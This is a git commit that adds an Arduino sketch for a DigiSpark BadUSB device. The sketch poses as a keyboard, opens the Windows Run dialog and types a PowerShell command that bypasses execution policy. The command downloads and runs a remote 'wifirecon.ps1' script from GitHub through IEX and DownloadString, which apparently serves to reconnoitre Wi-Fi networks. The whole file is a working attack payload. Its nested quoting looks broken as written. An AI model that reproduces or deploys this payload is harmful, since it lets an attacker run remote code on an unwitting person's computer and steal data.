d15545998e0047dcbbecb2e856d52b1ef3e5ed25
timebotdon <choyyld@gmail.com>
2019-11-06 21:52:30 +0800

    init

---
+++ arduino-scripts/wifirecon.ino
@@ -0,0 +1,14 @@
+//Credits to p0wc0w.
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell -exec bypass -c "powershell -exec bypass -c "IEX(New-object Net.Webclient).Downloadstring('https://github.com/timebotdon/DigiSpark-BadUSB/powershell-scripts/wifirecon.ps1')");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
